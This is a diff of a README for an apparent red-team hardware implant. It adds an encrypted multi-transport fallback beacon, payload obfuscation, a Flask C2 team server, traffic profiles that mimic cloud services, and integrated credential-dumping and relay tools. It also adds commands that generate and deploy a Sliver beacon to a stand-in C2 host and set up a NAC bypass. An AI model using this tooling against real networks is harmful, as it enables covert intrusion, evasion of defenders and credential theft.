@@ -17,6 +17,9 @@ The source code lives at [github.com/BenjiTrapp/TrashPandaPaws](https://github.c
 - [802.1X NAC Bypass](#8021x-nac-bypass)
 - [Dual Cover Identities](#dual-cover-identities)
 - [C2 Integration](#c2-integration)
+- [C2 Team Server](#c2-team-server)
+- [Malleable C2 Profiles](#malleable-c2-profiles)
+- [Offensive Tool Integration](#offensive-tool-integration)
 - [Multi Layer Persistence](#multi-layer-persistence)
 - [Remote Access](#remote-access)
 - [Credential Capture and Notifications](#credential-capture-and-notifications)
@@ -183,7 +186,11 @@ cover:
 
 ## C2 Integration
 
-The implant runs a Sliver beacon as its primary command and control channel. Sliver is an open source C2 framework that supports multiple transport protocols and is significantly harder to fingerprint than Cobalt Strike.
+The implant runs a Sliver beacon as its primary command and control channel. Sliver is an open source C2 framework that supports multiple transport protocols and is significantly harder to fingerprint than Cobalt Strike. A Python fallback beacon provides autonomous operation if the Sliver binary is unavailable or detected.
+
+All beacon communication uses AES 256 GCM authenticated encryption. Keys can be auto generated, manually set as base64, or derived from the callback URL via SHA 256. The server uses Python's `cryptography` library while the beacon calls OpenSSL via `ctypes`, and both implementations interoperate seamlessly.
+
+The Python beacon supports four transport channels with automatic fallthrough. If one channel fails, it tries the next in order:
 
 <pre class="mermaid">
 flowchart TD
@@ -192,18 +199,32 @@ flowchart TD
         PB["Python fallback beacon"]
     end
 
+    subgraph Transports["Transport fallthrough chain"]
+        T1["HTTPS\nurllib POST + AES GCM"]
+        T2["DNS\nBase32 subdomain queries"]
+        T3["SMB\nAnonymous IPC$ named pipes"]
+        T4["QUIC style UDP\n1200 byte datagrams"]
+        T1 -->|fail| T2
+        T2 -->|fail| T3
+        T3 -->|fail| T4
+    end
+
     subgraph Operator
         SS["Sliver server"]
+        TS["Team server\nFlask + GUI"]
     end
 
     SB -->|mTLS| SS
     SB -->|HTTPS| SS
     SB -->|DNS| SS
-    PB -.->|HTTPS fallback| SS
-    PB -.->|DNS exfil| SS
+    PB --> T1
+    T1 -->|success| TS
+    T2 -->|success| TS
+    T3 -->|success| TS
+    T4 -->|success| TS
 </pre>
 
-The beacon is generated from the operator's Sliver server as a native ARM64 Linux binary. It supports mTLS, HTTPS, and DNS transports with configurable jitter:
+The Sliver beacon is generated from the operator's server as a native ARM64 Linux binary with mTLS, HTTPS, and DNS transports:
 
 ```bash
 generate beacon --os linux --arch arm64 \
@@ -215,7 +236,97 @@ generate beacon --os linux --arch arm64 \
   --save ./bin/implant
 ```
 
-A Python fallback beacon provides autonomous operation if the Sliver binary is unavailable or detected. It supports HTTPS and DNS exfiltration channels independently.
+The Python fallback beacon's four channels each have distinct characteristics. HTTPS uses urllib POST requests with AES GCM encrypted bodies and supports malleable C2 profiles. DNS encodes agent IDs as Base32 subdomains. SMB uses a pure Python SMB2 stack over anonymous IPC$ named pipes. The QUIC style UDP channel fragments payloads into 1200 byte datagrams with stream reassembly.
+
+The beacon generator supports 1 to 6 layers of nested zlib and base64 encoding with randomized variable names, making each generated payload unique in structure.
+
+## C2 Team Server
+
+The team server is a Flask based command and control server with an embedded single page operator GUI. It manages encrypted beacon tasking and integrates offensive tools server side rather than pushing binaries to targets.
+
+<pre class="mermaid">
+flowchart LR
+    subgraph GUI["Operator GUI"]
+        DASH["Dashboard"]
+        TERM["Interactive terminal\nautocomplete + history"]
+        FB["File browser\nupload + download"]
+        LOOT["Loot viewer"]
+        PROC["Process list\nAV/EDR detection"]
+        NET["Network connections\nsecurity assessment"]
+        PIVOT["Pivot discovery\nadjacent subnets"]
+        LOG["Server logs\nfiltering"]
+    end
+
+    subgraph Server["Flask Team Server"]
+        API["REST API"]
+        TASK["Beacon tasking\nAES 256 GCM"]
+        TOOLS["Offensive tools\nserver side"]
+    end
+
+    GUI --> API
+    API --> TASK
+    API --> TOOLS
+</pre>
+
+The dashboard provides real time agent management, an interactive terminal with autocomplete and command history, a remote file browser supporting navigation, download, and upload, a loot viewer for collected credentials and files, process listing with automatic AV/EDR detection covering 35 endpoint protection products, network connection parsing with security assessment, pivot discovery for adjacent subnets, and global server log filtering.
+
+The team server can be deployed standalone or via Docker:
+
+```bash
+cd software/c2
+docker compose up -d
+
+# Custom configuration
+RACCOON_PORT=443 RACCOON_SSL=1 docker compose up -d
+```
+
+Environment variables control the server: `RACCOON_PORT` (default 8443), `RACCOON_HOST`, `RACCOON_KEY` (base64 AES 256 GCM key), `RACCOON_TOKEN` (operator auth token), and `RACCOON_SSL` with certificate paths. The Docker image runs `python:3.12-slim` with `network_mode: host` and `NET_RAW`/`NET_ADMIN` capabilities for Responder integration.
+
+## Malleable C2 Profiles
+
+Malleable profiles control how beacon traffic looks on the wire: URIs, headers, User Agent strings, metadata encoding chains, and TLS certificate parameters. Eight built in profiles mimic legitimate cloud services:
+
+| Profile | Mimics |
+|---------|--------|
+| Amazon CDN | CloudFront distribution traffic |
+| Slack API | Slack workspace API calls |
+| Google APIs | Google Cloud service requests |
+| OneDrive Sync | Microsoft OneDrive file synchronization |
+| jQuery CDN | jQuery library CDN requests |
+| GitHub API | GitHub REST API interactions |
+| Outlook/O365 | Microsoft 365 mail traffic |
+| Cloudflare Workers | Cloudflare serverless function calls |
+
+The profile editor in the team server GUI provides syntax highlighting, real time linting, and a seven section tutorial sidebar. Profiles can be generated from captured HTTP traffic by pasting raw Burp Suite request/response pairs and choosing an encoding. Running beacons accept live profile pushes without redeployment, and the operator can verify the result by capturing beacon HTTP requests.
+
+## Offensive Tool Integration
+
+The team server integrates offensive tools server side, keeping binaries off the target. Sixteen Impacket based tools run from the server through beacon sessions:
+
+| Tool | Purpose |
+|------|---------|
+| PsExec | Remote command execution via SMB service |
+| WMIExec | Remote execution via WMI |
+| SMBExec | Remote execution via SMB shares |
+| SecretsDump | Extract credentials from SAM, LSA, NTDS |
+| Kerberoast | Request and crack service ticket hashes |
+| AS REP Roast | Attack accounts without preauth |
+| DCSync | Replicate credentials from domain controller |
+
+Beyond Impacket, the server integrates four additional tools:
+
+| Tool | Purpose |
+|------|---------|
+| NetExec (nxc) | Host enumeration, AV/EDR detection, credential spraying |
+| Lsassy | Remote LSASS credential dumping |
+| RelayKing | NTLM relay vulnerability auditing |
+| Responder | LLMNR, NBT NS, and mDNS poisoning |
+
+### SMBLoot
+
+SMBLoot is a pure Python SMB2 browser built from `socket`, `struct`, `hashlib`, and `hmac` alone. It implements the complete SMB2 protocol stack (negotiate, NTLMv2 auth, tree connect, create, read, query directory) without any external dependencies. This means the operator can browse remote shares, read files, download files, and enumerate directory trees without deploying Impacket on the target.
+
+SMBLoot supports pass the hash authentication via LM:NT format, making it useful when only NTLM hashes are available from credential dumps.
 
 ## Multi Layer Persistence
 
@@ -303,7 +414,20 @@ When someone browses to the fake printer page and enters credentials, the implan
 
 ## Quick Start
 
-The setup runs on ParrotOS ARM64 and consists of four commands:
+### Image Builder (Recommended)
+
+The fastest path to a deployment ready SD card is the image builder. It downloads ParrotOS ARM64, injects the Raccoon software and config, and creates a first boot provisioning service that installs dependencies, configures networking, and enables services automatically:
+
+```bash
+sudo ./software/setup/build_image.sh /dev/sdX
+sudo ./software/setup/build_image.sh /dev/sdX --wifi MyNetwork:MyPassword
+sudo ./software/setup/build_image.sh /dev/sdX --config /path/to/raccoon.yaml \
+  --user operator:s3cret --wifi FieldOps:hunter2
+```
+
+### Manual Setup
+
+For manual installation on an existing ParrotOS ARM64 system, four commands handle everything:
 
 ```bash
 # Install dependencies and harden the OS
@@ -317,6 +441,26 @@ sudo ./services/install.sh
 
 # Activate everything
 sudo reboot
+```
+
+### Sliver Deployment
+
+The `deploy_sliver.sh` script automates generating and deploying the Sliver beacon binary:
+
+```bash
+./software/setup/deploy_sliver.sh generate           # interactive
+./software/setup/deploy_sliver.sh generate-auto c2.example.com
+./software/setup/deploy_sliver.sh deploy 192.168.1.100
+./software/setup/deploy_sliver.sh full c2.example.com 192.168.1.100
+```
+
+### NAC Bypass Setup
+
+The NAC bypass can be configured and monitored independently:
+
+```bash
+sudo ./software/setup/nac_bypass.sh setup
+sudo ./software/setup/nac_bypass.sh status
 ```
 
 After reboot, the C2 beacon starts automatically via the five persistence layers. No manual intervention required.
